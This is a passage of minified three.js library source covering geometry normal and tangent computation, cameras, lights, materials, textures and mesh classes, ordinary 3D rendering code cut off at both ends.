e=b[s].index;for(w=a,l=a+f;w<l;w+=3){C=e+c[w];A=e+c[w+1];u=e+c[w+2];m=g[C*3];k=g[C*3+1];h=g[C*3+2];t.set(m,k,h);m=g[A*3];k=g[A*3+1];h=g[A*3+2];r.set(m,k,h);m=g[u*3];k=g[u*3+1];h=g[u*3+2];q.set(m,k,h);p.subVectors(q,r);E.subVectors(t,r);p.cross(E);o[C*3]+=p.x;o[C*3+1]+=p.y;o[C*3+2]+=p.z;o[A*3]+=p.x;o[A*3+1]+=p.y;o[A*3+2]+=p.z;o[u*3]+=p.x;o[u*3+1]+=p.y;o[u*3+2]+=p.z}}}else{for(w=0,l=g.length;w<l;w+=9){m=g[w];k=g[w+1];h=g[w+2];t.set(m,k,h);m=g[w+3];k=g[w+4];h=g[w+5];r.set(m,k,h);m=g[w+6];k=g[w+7];h=g[w+8];q.set(m,k,h);p.subVectors(q,r);E.subVectors(t,r);p.cross(E);o[w]=p.x;o[w+1]=p.y;o[w+2]=p.z;o[w+3]=p.x;o[w+4]=p.y;o[w+5]=p.z;o[w+6]=p.x;o[w+7]=p.y;o[w+8]=p.z}}this.normalizeNormals();this.normalsNeedUpdate=true}},normalizeNormals:function(){var e=this.attributes.normal.array;var a,h,f,g;for(var c=0,b=e.length;c<b;c+=3){a=e[c];h=e[c+1];f=e[c+2];g=1/Math.sqrt(a*a+h*h+f*f);e[c]*=g;e[c+1]*=g;e[c+2]*=g}},computeTangents:function(){if(this.attributes.index===undefined||this.attributes.position===undefined||this.attributes.normal===undefined||this.attributes.uv===undefined){console.warn("Missing required attributes (index, position, normal or uv) in BufferGeometry.computeTangents()");return}var g=this.attributes.index.array;var u=this.attributes.position.array;var A=this.attributes.normal.array;var S=this.attributes.uv.array;var z=u.length/3;if(this.attributes.tangent===undefined){var B=4*z;this.attributes.tangent={itemSize:4,array:new Float32Array(B),numItems:B}}var I=this.attributes.tangent.array;var am=[],al=[];for(var af=0;af<z;af++){am[af]=new THREE.Vector3();al[af]=new THREE.Vector3()}var o,ad,H,m,ac,G,l,aa,E,h,Z,f,X,e,V,y,x,ao,an,Q,P,ak,aj,O,N,W;var p=new THREE.Vector3(),K=new THREE.Vector3();function R(k,j,r){o=u[k*3];ad=u[k*3+1];H=u[k*3+2];m=u[j*3];ac=u[j*3+1];G=u[j*3+2];l=u[r*3];aa=u[r*3+1];E=u[r*3+2];h=S[k*2];Z=S[k*2+1];f=S[j*2];X=S[j*2+1];e=S[r*2];V=S[r*2+1];y=m-o;x=l-o;ao=ac-ad;an=aa-ad;Q=G-H;P=E-H;ak=f-h;aj=e-h;O=X-Z;N=V-Z;W=1/(ak*N-aj*O);p.set((N*y-O*x)*W,(N*ao-O*an)*W,(N*Q-O*P)*W);K.set((ak*x-aj*y)*W,(ak*an-aj*ao)*W,(ak*P-aj*Q)*W);am[k].add(p);am[j].add(p);am[r].add(p);al[k].add(K);al[j].add(K);al[r].add(K)}var ah,L;var ag,s;var c,b,a;var D=this.offsets;for(ag=0,s=D.length;ag<s;++ag){var F=D[ag].start;var Y=D[ag].count;var M=D[ag].index;for(ah=F,L=F+Y;ah<L;ah+=3){c=M+g[ah];b=M+g[ah+1];a=M+g[ah+2];R(c,b,a)}}var ab=new THREE.Vector3(),ai=new THREE.Vector3();var ae=new THREE.Vector3(),J=new THREE.Vector3();var T,U,q;function C(j){ae.x=A[j*3];ae.y=A[j*3+1];ae.z=A[j*3+2];J.copy(ae);U=am[j];ab.copy(U);ab.sub(ae.multiplyScalar(ae.dot(U))).normalize();ai.crossVectors(J,U);q=ai.dot(al[j]);T=(q<0)?-1:1;I[j*4]=ab.x;I[j*4+1]=ab.y;I[j*4+2]=ab.z;I[j*4+3]=T}for(ag=0,s=D.length;ag<s;++ag){var F=D[ag].start;var Y=D[ag].count;var M=D[ag].index;for(ah=F,L=F+Y;ah<L;ah+=3){c=M+g[ah];b=M+g[ah+1];a=M+g[ah+2];C(c);C(b);C(a)}}this.hasTangents=true;this.tangentsNeedUpdate=true},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.Camera=function(){THREE.Object3D.call(this);this.matrixWorldInverse=new THREE.Matrix4();this.projectionMatrix=new THREE.Matrix4();this.projectionMatrixInverse=new THREE.Matrix4()};THREE.Camera.prototype=Object.create(THREE.Object3D.prototype);THREE.Camera.prototype.lookAt=function(){var a=new THREE.Matrix4();return function(b){a.lookAt(this.position,b,this.up);if(this.useQuaternion===true){this.quaternion.setFromRotationMatrix(a)}else{this.rotation.setEulerFromRotationMatrix(a,this.eulerOrder)}}}();THREE.OrthographicCamera=function(g,c,f,b,e,a){THREE.Camera.call(this);this.left=g;this.right=c;this.top=f;this.bottom=b;this.near=(e!==undefined)?e:0.1;this.far=(a!==undefined)?a:2000;this.updateProjectionMatrix()};THREE.OrthographicCamera.prototype=Object.create(THREE.Camera.prototype);THREE.OrthographicCamera.prototype.updateProjectionMatrix=function(){this.projectionMatrix.makeOrthographic(this.left,this.right,this.top,this.bottom,this.near,this.far)};THREE.PerspectiveCamera=function(c,b,e,a){THREE.Camera.call(this);this.fov=c!==undefined?c:50;this.aspect=b!==undefined?b:1;this.near=e!==undefined?e:0.1;this.far=a!==undefined?a:2000;this.updateProjectionMatrix()};THREE.PerspectiveCamera.prototype=Object.create(THREE.Camera.prototype);THREE.PerspectiveCamera.prototype.setLens=function(b,a){if(a===undefined){a=24}this.fov=2*THREE.Math.radToDeg(Math.atan(a/(b*2)));this.updateProjectionMatrix()};THREE.PerspectiveCamera.prototype.setViewOffset=function(f,c,b,g,e,a){this.fullWidth=f;this.fullHeight=c;this.x=b;this.y=g;this.width=e;this.height=a;this.updateProjectionMatrix()};THREE.PerspectiveCamera.prototype.updateProjectionMatrix=function(){if(this.fullWidth){var c=this.fullWidth/this.fullHeight;var h=Math.tan(THREE.Math.degToRad(this.fov*0.5))*this.near;var b=-h;var g=c*b;var e=c*h;var f=Math.abs(e-g);var a=Math.abs(h-b);this.projectionMatrix.makeFrustum(g+this.x*f/this.fullWidth,g+(this.x+this.width)*f/this.fullWidth,h-(this.y+this.height)*a/this.fullHeight,h-this.y*a/this.fullHeight,this.near,this.far)}else{this.projectionMatrix.makePerspective(this.fov,this.aspect,this.near,this.far)}};THREE.Light=function(a){THREE.Object3D.call(this);this.color=new THREE.Color(a)};THREE.Light.prototype=Object.create(THREE.Object3D.prototype);THREE.Light.prototype.clone=function(a){if(a===undefined){a=new THREE.Light()}THREE.Object3D.prototype.clone.call(this,a);a.color.copy(this.color);return a};THREE.AmbientLight=function(a){THREE.Light.call(this,a)};THREE.AmbientLight.prototype=Object.create(THREE.Light.prototype);THREE.AmbientLight.prototype.clone=function(){var a=new THREE.AmbientLight();THREE.Light.prototype.clone.call(this,a);return a};THREE.AreaLight=function(b,a){THREE.Light.call(this,b);this.normal=new THREE.Vector3(0,-1,0);this.right=new THREE.Vector3(1,0,0);this.intensity=(a!==undefined)?a:1;this.width=1;this.height=1;this.constantAttenuation=1.5;this.linearAttenuation=0.5;this.quadraticAttenuation=0.1};THREE.AreaLight.prototype=Object.create(THREE.Light.prototype);THREE.DirectionalLight=function(b,a){THREE.Light.call(this,b);this.position.set(0,1,0);this.target=new THREE.Object3D();this.intensity=(a!==undefined)?a:1;this.castShadow=false;this.onlyShadow=false;this.shadowCameraNear=50;this.shadowCameraFar=5000;this.shadowCameraLeft=-500;this.shadowCameraRight=500;this.shadowCameraTop=500;this.shadowCameraBottom=-500;this.shadowCameraVisible=false;this.shadowBias=0;this.shadowDarkness=0.5;this.shadowMapWidth=512;this.shadowMapHeight=512;this.shadowCascade=false;this.shadowCascadeOffset=new THREE.Vector3(0,0,-1000);this.shadowCascadeCount=2;this.shadowCascadeBias=[0,0,0];this.shadowCascadeWidth=[512,512,512];this.shadowCascadeHeight=[512,512,512];this.shadowCascadeNearZ=[-1,0.99,0.998];this.shadowCascadeFarZ=[0.99,0.998,1];this.shadowCascadeArray=[];this.shadowMap=null;this.shadowMapSize=null;this.shadowCamera=null;this.shadowMatrix=null};THREE.DirectionalLight.prototype=Object.create(THREE.Light.prototype);THREE.DirectionalLight.prototype.clone=function(){var a=new THREE.DirectionalLight();THREE.Light.prototype.clone.call(this,a);a.target=this.target.clone();a.intensity=this.intensity;a.castShadow=this.castShadow;a.onlyShadow=this.onlyShadow;return a};THREE.HemisphereLight=function(b,c,a){THREE.Light.call(this,b);this.position.set(0,100,0);this.groundColor=new THREE.Color(c);this.intensity=(a!==undefined)?a:1};THREE.HemisphereLight.prototype=Object.create(THREE.Light.prototype);THREE.HemisphereLight.prototype.clone=function(){var a=new THREE.PointLight();THREE.Light.prototype.clone.call(this,a);a.groundColor.copy(this.groundColor);a.intensity=this.intensity;return a};THREE.PointLight=function(b,a,c){THREE.Light.call(this,b);this.intensity=(a!==undefined)?a:1;this.distance=(c!==undefined)?c:0};THREE.PointLight.prototype=Object.create(THREE.Light.prototype);THREE.PointLight.prototype.clone=function(){var a=new THREE.PointLight();THREE.Light.prototype.clone.call(this,a);a.intensity=this.intensity;a.distance=this.distance;return a};THREE.SpotLight=function(b,a,f,e,c){THREE.Light.call(this,b);this.position.set(0,1,0);this.target=new THREE.Object3D();this.intensity=(a!==undefined)?a:1;this.distance=(f!==undefined)?f:0;this.angle=(e!==undefined)?e:Math.PI/3;this.exponent=(c!==undefined)?c:10;this.castShadow=false;this.onlyShadow=false;this.shadowCameraNear=50;this.shadowCameraFar=5000;this.shadowCameraFov=50;this.shadowCameraVisible=false;this.shadowBias=0;this.shadowDarkness=0.5;this.shadowMapWidth=512;this.shadowMapHeight=512;this.shadowMap=null;this.shadowMapSize=null;this.shadowCamera=null;this.shadowMatrix=null};THREE.SpotLight.prototype=Object.create(THREE.Light.prototype);THREE.SpotLight.prototype.clone=function(){var a=new THREE.SpotLight();THREE.Light.prototype.clone.call(this,a);a.target=this.target.clone();a.intensity=this.intensity;a.distance=this.distance;a.angle=this.angle;a.exponent=this.exponent;a.castShadow=this.castShadow;a.onlyShadow=this.onlyShadow;return a};THREE.Material=function(){this.id=THREE.MaterialIdCount++;this.name="";this.side=THREE.FrontSide;this.opacity=1;this.transparent=false;this.blending=THREE.NormalBlending;this.blendSrc=THREE.SrcAlphaFactor;this.blendDst=THREE.OneMinusSrcAlphaFactor;this.blendEquation=THREE.AddEquation;this.depthTest=true;this.depthWrite=true;this.polygonOffset=false;this.polygonOffsetFactor=0;this.polygonOffsetUnits=0;this.alphaTest=0;this.overdraw=false;this.visible=true;this.needsUpdate=true};THREE.Material.prototype={constructor:THREE.Material,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,setValues:function(a){if(a===undefined){return}for(var b in a){var e=a[b];if(e===undefined){console.warn("THREE.Material: '"+b+"' parameter is undefined.");continue}if(b in this){var c=this[b];if(c instanceof THREE.Color){c.set(e)}else{if(c instanceof THREE.Vector3&&e instanceof THREE.Vector3){c.copy(e)}else{this[b]=e}}}}},clone:function(a){if(a===undefined){a=new THREE.Material()}a.name=this.name;a.side=this.side;a.opacity=this.opacity;a.transparent=this.transparent;a.blending=this.blending;a.blendSrc=this.blendSrc;a.blendDst=this.blendDst;a.blendEquation=this.blendEquation;a.depthTest=this.depthTest;a.depthWrite=this.depthWrite;a.polygonOffset=this.polygonOffset;a.polygonOffsetFactor=this.polygonOffsetFactor;a.polygonOffsetUnits=this.polygonOffsetUnits;a.alphaTest=this.alphaTest;a.overdraw=this.overdraw;a.visible=this.visible;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.MaterialIdCount=0;THREE.LineBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.linewidth=1;this.linecap="round";this.linejoin="round";this.vertexColors=false;this.fog=true;this.setValues(a)};THREE.LineBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineBasicMaterial.prototype.clone=function(){var a=new THREE.LineBasicMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.linewidth=this.linewidth;a.linecap=this.linecap;a.linejoin=this.linejoin;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};THREE.LineDashedMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.linewidth=1;this.scale=1;this.dashSize=3;this.gapSize=1;this.vertexColors=false;this.fog=true;this.setValues(a)};THREE.LineDashedMaterial.prototype=Object.create(THREE.Material.prototype);THREE.LineDashedMaterial.prototype.clone=function(){var a=new THREE.LineDashedMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.linewidth=this.linewidth;a.scale=this.scale;a.dashSize=this.dashSize;a.gapSize=this.gapSize;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};THREE.MeshBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.map=null;this.lightMap=null;this.specularMap=null;this.envMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=0.98;this.fog=true;this.shading=THREE.SmoothShading;this.wireframe=false;this.wireframeLinewidth=1;this.wireframeLinecap="round";this.wireframeLinejoin="round";this.vertexColors=THREE.NoColors;this.skinning=false;this.morphTargets=false;this.setValues(a)};THREE.MeshBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshBasicMaterial.prototype.clone=function(){var a=new THREE.MeshBasicMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.lightMap=this.lightMap;a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;return a};THREE.MeshLambertMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.ambient=new THREE.Color(16777215);this.emissive=new THREE.Color(0);this.wrapAround=false;this.wrapRGB=new THREE.Vector3(1,1,1);this.map=null;this.lightMap=null;this.specularMap=null;this.envMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=0.98;this.fog=true;this.shading=THREE.SmoothShading;this.wireframe=false;this.wireframeLinewidth=1;this.wireframeLinecap="round";this.wireframeLinejoin="round";this.vertexColors=THREE.NoColors;this.skinning=false;this.morphTargets=false;this.morphNormals=false;this.setValues(a)};THREE.MeshLambertMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshLambertMaterial.prototype.clone=function(){var a=new THREE.MeshLambertMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.ambient.copy(this.ambient);a.emissive.copy(this.emissive);a.wrapAround=this.wrapAround;a.wrapRGB.copy(this.wrapRGB);a.map=this.map;a.lightMap=this.lightMap;a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;a.morphNormals=this.morphNormals;return a};THREE.MeshPhongMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.ambient=new THREE.Color(16777215);this.emissive=new THREE.Color(0);this.specular=new THREE.Color(1118481);this.shininess=30;this.metal=false;this.perPixel=true;this.wrapAround=false;this.wrapRGB=new THREE.Vector3(1,1,1);this.map=null;this.lightMap=null;this.bumpMap=null;this.bumpScale=1;this.normalMap=null;this.normalScale=new THREE.Vector2(1,1);this.specularMap=null;this.envMap=null;this.combine=THREE.MultiplyOperation;this.reflectivity=1;this.refractionRatio=0.98;this.fog=true;this.shading=THREE.SmoothShading;this.wireframe=false;this.wireframeLinewidth=1;this.wireframeLinecap="round";this.wireframeLinejoin="round";this.vertexColors=THREE.NoColors;this.skinning=false;this.morphTargets=false;this.morphNormals=false;this.setValues(a)};THREE.MeshPhongMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshPhongMaterial.prototype.clone=function(){var a=new THREE.MeshPhongMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.ambient.copy(this.ambient);a.emissive.copy(this.emissive);a.specular.copy(this.specular);a.shininess=this.shininess;a.metal=this.metal;a.perPixel=this.perPixel;a.wrapAround=this.wrapAround;a.wrapRGB.copy(this.wrapRGB);a.map=this.map;a.lightMap=this.lightMap;a.bumpMap=this.bumpMap;a.bumpScale=this.bumpScale;a.normalMap=this.normalMap;a.normalScale.copy(this.normalScale);a.specularMap=this.specularMap;a.envMap=this.envMap;a.combine=this.combine;a.reflectivity=this.reflectivity;a.refractionRatio=this.refractionRatio;a.fog=this.fog;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.wireframeLinecap=this.wireframeLinecap;a.wireframeLinejoin=this.wireframeLinejoin;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;a.morphNormals=this.morphNormals;return a};THREE.MeshDepthMaterial=function(a){THREE.Material.call(this);this.wireframe=false;this.wireframeLinewidth=1;this.setValues(a)};THREE.MeshDepthMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshDepthMaterial.prototype.clone=function(){var a=new THREE.MeshDepthMaterial();THREE.Material.prototype.clone.call(this,a);a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;return a};THREE.MeshNormalMaterial=function(a){THREE.Material.call(this,a);this.shading=THREE.FlatShading;this.wireframe=false;this.wireframeLinewidth=1;this.morphTargets=false;this.setValues(a)};THREE.MeshNormalMaterial.prototype=Object.create(THREE.Material.prototype);THREE.MeshNormalMaterial.prototype.clone=function(){var a=new THREE.MeshNormalMaterial();THREE.Material.prototype.clone.call(this,a);a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;return a};THREE.MeshFaceMaterial=function(a){this.materials=a instanceof Array?a:[]};THREE.MeshFaceMaterial.prototype.clone=function(){return new THREE.MeshFaceMaterial(this.materials.slice(0))};THREE.ParticleBasicMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.map=null;this.size=1;this.sizeAttenuation=true;this.vertexColors=false;this.fog=true;this.setValues(a)};THREE.ParticleBasicMaterial.prototype=Object.create(THREE.Material.prototype);THREE.ParticleBasicMaterial.prototype.clone=function(){var a=new THREE.ParticleBasicMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.size=this.size;a.sizeAttenuation=this.sizeAttenuation;a.vertexColors=this.vertexColors;a.fog=this.fog;return a};THREE.ShaderMaterial=function(a){THREE.Material.call(this);this.fragmentShader="void main() {}";this.vertexShader="void main() {}";this.uniforms={};this.defines={};this.attributes=null;this.shading=THREE.SmoothShading;this.linewidth=1;this.wireframe=false;this.wireframeLinewidth=1;this.fog=false;this.lights=false;this.vertexColors=THREE.NoColors;this.skinning=false;this.morphTargets=false;this.morphNormals=false;this.setValues(a)};THREE.ShaderMaterial.prototype=Object.create(THREE.Material.prototype);THREE.ShaderMaterial.prototype.clone=function(){var a=new THREE.ShaderMaterial();THREE.Material.prototype.clone.call(this,a);a.fragmentShader=this.fragmentShader;a.vertexShader=this.vertexShader;a.uniforms=THREE.UniformsUtils.clone(this.uniforms);a.attributes=this.attributes;a.defines=this.defines;a.shading=this.shading;a.wireframe=this.wireframe;a.wireframeLinewidth=this.wireframeLinewidth;a.fog=this.fog;a.lights=this.lights;a.vertexColors=this.vertexColors;a.skinning=this.skinning;a.morphTargets=this.morphTargets;a.morphNormals=this.morphNormals;return a};THREE.SpriteMaterial=function(a){THREE.Material.call(this);this.color=new THREE.Color(16777215);this.map=new THREE.Texture();this.useScreenCoordinates=true;this.depthTest=!this.useScreenCoordinates;this.sizeAttenuation=!this.useScreenCoordinates;this.scaleByViewport=!this.sizeAttenuation;this.alignment=THREE.SpriteAlignment.center.clone();this.fog=false;this.uvOffset=new THREE.Vector2(0,0);this.uvScale=new THREE.Vector2(1,1);this.setValues(a);a=a||{};if(a.depthTest===undefined){this.depthTest=!this.useScreenCoordinates}if(a.sizeAttenuation===undefined){this.sizeAttenuation=!this.useScreenCoordinates}if(a.scaleByViewport===undefined){this.scaleByViewport=!this.sizeAttenuation}};THREE.SpriteMaterial.prototype=Object.create(THREE.Material.prototype);THREE.SpriteMaterial.prototype.clone=function(){var a=new THREE.SpriteMaterial();THREE.Material.prototype.clone.call(this,a);a.color.copy(this.color);a.map=this.map;a.useScreenCoordinates=this.useScreenCoordinates;a.sizeAttenuation=this.sizeAttenuation;a.scaleByViewport=this.scaleByViewport;a.alignment.copy(this.alignment);a.uvOffset.copy(this.uvOffset);a.uvScale.copy(this.uvScale);a.fog=this.fog;return a};THREE.SpriteAlignment={};THREE.SpriteAlignment.topLeft=new THREE.Vector2(1,-1);THREE.SpriteAlignment.topCenter=new THREE.Vector2(0,-1);THREE.SpriteAlignment.topRight=new THREE.Vector2(-1,-1);THREE.SpriteAlignment.centerLeft=new THREE.Vector2(1,0);THREE.SpriteAlignment.center=new THREE.Vector2(0,0);THREE.SpriteAlignment.centerRight=new THREE.Vector2(-1,0);THREE.SpriteAlignment.bottomLeft=new THREE.Vector2(1,1);THREE.SpriteAlignment.bottomCenter=new THREE.Vector2(0,1);THREE.SpriteAlignment.bottomRight=new THREE.Vector2(-1,1);THREE.Texture=function(e,b,g,f,k,c,j,h,a){this.id=THREE.TextureIdCount++;this.name="";this.image=e;this.mipmaps=[];this.mapping=b!==undefined?b:new THREE.UVMapping();this.wrapS=g!==undefined?g:THREE.ClampToEdgeWrapping;this.wrapT=f!==undefined?f:THREE.ClampToEdgeWrapping;this.magFilter=k!==undefined?k:THREE.LinearFilter;this.minFilter=c!==undefined?c:THREE.LinearMipMapLinearFilter;this.anisotropy=a!==undefined?a:1;this.format=j!==undefined?j:THREE.RGBAFormat;this.type=h!==undefined?h:THREE.UnsignedByteType;this.offset=new THREE.Vector2(0,0);this.repeat=new THREE.Vector2(1,1);this.generateMipmaps=true;this.premultiplyAlpha=false;this.flipY=true;this.unpackAlignment=4;this.needsUpdate=false;this.onUpdate=null};THREE.Texture.prototype={constructor:THREE.Texture,addEventListener:THREE.EventDispatcher.prototype.addEventListener,hasEventListener:THREE.EventDispatcher.prototype.hasEventListener,removeEventListener:THREE.EventDispatcher.prototype.removeEventListener,dispatchEvent:THREE.EventDispatcher.prototype.dispatchEvent,clone:function(a){if(a===undefined){a=new THREE.Texture()}a.image=this.image;a.mipmaps=this.mipmaps.slice(0);a.mapping=this.mapping;a.wrapS=this.wrapS;a.wrapT=this.wrapT;a.magFilter=this.magFilter;a.minFilter=this.minFilter;a.anisotropy=this.anisotropy;a.format=this.format;a.type=this.type;a.offset.copy(this.offset);a.repeat.copy(this.repeat);a.generateMipmaps=this.generateMipmaps;a.premultiplyAlpha=this.premultiplyAlpha;a.flipY=this.flipY;a.unpackAlignment=this.unpackAlignment;return a},dispose:function(){this.dispatchEvent({type:"dispose"})}};THREE.TextureIdCount=0;THREE.CompressedTexture=function(f,e,m,k,j,b,h,g,l,c,a){THREE.Texture.call(this,null,b,h,g,l,c,k,j,a);this.image={width:e,height:m};this.mipmaps=f;this.generateMipmaps=false};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.clone=function(){var a=new THREE.CompressedTexture();THREE.Texture.prototype.clone.call(this,a);return a};THREE.DataTexture=function(g,e,m,k,j,b,h,f,l,c,a){THREE.Texture.call(this,null,b,h,f,l,c,k,j,a);this.image={data:g,width:e,height:m}};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.clone=function(){var a=new THREE.DataTexture();THREE.Texture.prototype.clone.call(this,a);return a};THREE.Particle=function(a){THREE.Object3D.call(this);this.material=a};THREE.Particle.prototype=Object.create(THREE.Object3D.prototype);THREE.Particle.prototype.clone=function(a){if(a===undefined){a=new THREE.Particle(this.material)}THREE.Object3D.prototype.clone.call(this,a);return a};THREE.ParticleSystem=function(b,a){THREE.Object3D.call(this);this.geometry=b;this.material=(a!==undefined)?a:new THREE.ParticleBasicMaterial({color:Math.random()*16777215});this.sortParticles=false;if(this.geometry){if(this.geometry.boundingSphere===null){this.geometry.computeBoundingSphere()}}this.frustumCulled=false};THREE.ParticleSystem.prototype=Object.create(THREE.Object3D.prototype);THREE.ParticleSystem.prototype.clone=function(a){if(a===undefined){a=new THREE.ParticleSystem(this.geometry,this.material)}a.sortParticles=this.sortParticles;THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Line=function(c,b,a){THREE.Object3D.call(this);this.geometry=c;this.material=(b!==undefined)?b:new THREE.LineBasicMaterial({color:Math.random()*16777215});this.type=(a!==undefined)?a:THREE.LineStrip;if(this.geometry){if(!this.geometry.boundingSphere){this.geometry.computeBoundingSphere()}}};THREE.LineStrip=0;THREE.LinePieces=1;THREE.Line.prototype=Object.create(THREE.Object3D.prototype);THREE.Line.prototype.clone=function(a){if(a===undefined){a=new THREE.Line(this.geometry,this.material,this.type)}THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Mesh=function(b,a){THREE.Object3D.call(this);this.geometry=null;this.material=null;this.setGeometry(b);this.setMaterial(a)};THREE.Mesh.prototype=Object.create(THREE.Object3D.prototype);THREE.Mesh.prototype.setGeometry=function(a){if(a!==undefined){this.geometry=a;if(this.geometry.boundingSphere===null){this.geometry.computeBoundingSphere()}this.updateMorphTargets()}};THREE.Mesh.prototype.setMaterial=function(a){if(a!==undefined){this.material=a}else{this.material=new THREE.MeshBasicMaterial({color:Math.random()*16777215,wireframe:true})}};THREE.Mesh.prototype.updateMorphTargets=function(){if(this.geometry.morphTargets.length>0){this.morphTargetBase=-1;this.morphTargetForcedOrder=[];this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var a=0,b=this.geometry.morphTargets.length;a<b;a++){this.morphTargetInfluences.push(0);this.morphTargetDictionary[this.geometry.morphTargets[a].name]=a}}};THREE.Mesh.prototype.getMorphTargetIndexByName=function(a){if(this.morphTargetDictionary[a]!==undefined){return this.morphTargetDictionary[a]}console.log("THREE.Mesh.getMorphTargetIndexByName: morph target "+a+" does not exist. Returning 0.");return 0};THREE.Mesh.prototype.clone=function(a){if(a===undefined){a=new THREE.Mesh(this.geometry,this.material)}THREE.Object3D.prototype.clone.call(this,a);return a};THREE.Bone=function(a){THREE.Object3D.call(this);this.skin=a;this.skinMatrix=new THREE.Matrix4()};THREE.Bone.prototype=Object.create(THREE.Object3D.prototype);THREE.Bone.prototype.update=function(e,b){if(this.matrixAutoUpdate){b|=this.updateMatrix()}if(b||this.matrixWorldNeedsUpdate){if(e){this.skinMatrix.multiplyMatrices(e,this.matrix)}else{this.skinMatrix.copy(this.matrix)}this.matrixWorldNeedsUpdate=false;b=true}var f,c,a=this.children.length;for(c=0;c<a;c++){this.children[c].update(this.skinMatrix,b)}};THREE.SkinnedMesh=function(g,f,e){THREE.Mesh.call(this,g,f);this.useVertexTexture=e!==undefined?e:true;this.identityMatrix=new THREE.Matrix4();this.bones=[];this.boneMatrices=[];var h,k,l,c,a,o;if(this.geometry&&this.geometry.bones!==undefined){for(h=0;h<this.geometry.bones.length;h++){l=this.geometry.bones[h];c=l.pos;a=l.rotq;o=l.scl;k=this.addBone();k.name=l.name;k.position.set(c[0],c[1],c[2]);k.quaternion.set(a[0],a[1],a[2],a[3]);k.useQuaternion=true;if(o!==undefined){k.scale.set(o[0],o[1],o[2])}else{k.scale.set(1,1,1)}}for(h=0;h<this.bones.length;h++){l=this.geometry.bones[h];k=this.bones[h];if(l.parent===-1){this.add(k)}else{this.bones[l.parent].add(k)}}var j=this.bones.length;if(this.useVertexTexture){var m;if(j>256){m=64}else{if(j>64){m=32}else{if(j>16){m=16}else{m=8}}}this.boneTextureWidth=m;this.boneTextureHeight=m;this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4);this.boneTexture=new THREE.DataTexture(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,THREE.RGBAFormat,THREE.FloatType);this.boneTexture.minFilter=THREE.NearestFilter;this.boneTexture.magFilter=THREE.NearestFilter;this.boneTexture.generateMipmaps=false;this.boneTexture.flipY=false}else{this.boneMatrices=new Float32Array(16*j)}this.pose()}};THREE.SkinnedMesh.prototype=Object.create(THREE.Mesh.prototype);THREE.SkinnedMesh.prototype.addBone=function(a){if(a===undefined){a=new THREE.Bone(this)}this.bones.push(a);return a};THREE.SkinnedMesh.prototype.updateMatrixWorld=function(g){this.matrixAutoUpdate&&this.updateMatrix();if(this.matrixWorldNeedsUpdate||g){if(this.parent){this.matrixWorld.multiplyMatrices(this.parent.matrixWorld,this.matrix)}else{this.matrixWorld.copy(this.matrix)}this.matrixWorldNeedsUpdate=false;g=true}for(var f=0,e=this.children.length;f<e;f++){var j=this.children[f];if(j instanceof THREE.Bone){j.update(this.identityMatrix,false)}else{j.updateMatrixWorld(true)}}if(this.boneInverses==undefined){this.boneInverses=[];for(var a=0,h=this.bones.length;a<h;a++){var c=new THREE.Matrix4();c.getInverse(this.bones[a].skinMatrix);this.boneInverses.push(c)}}for(var 